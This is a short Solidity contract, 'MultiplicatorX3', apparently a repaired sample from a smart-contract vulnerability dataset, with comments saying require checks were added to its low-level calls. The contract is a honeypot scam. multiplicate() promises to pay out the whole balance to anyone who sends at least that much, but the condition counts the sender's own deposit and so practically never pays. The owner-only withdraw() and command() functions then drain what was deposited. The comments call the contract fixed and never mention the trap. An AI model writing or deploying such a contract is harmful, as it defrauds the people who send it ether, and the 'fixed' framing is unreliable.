pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }

    function multiplicate(address adr) public payable {
        if (msg.value >= this.balance) {
            require(adr.call.value(this.balance + msg.value)());
        }
    }
} 

// Changes made:
// 1. Changed Owner to owner for consistency with Solidity naming conventions.
// 2. Added require statement to check the return value of the external call in the command function to prevent unchecked low level call vulnerability.
// 3. Added require statement to check the return value of the external call in the multiplicate function to prevent unchecked low level call vulnerability.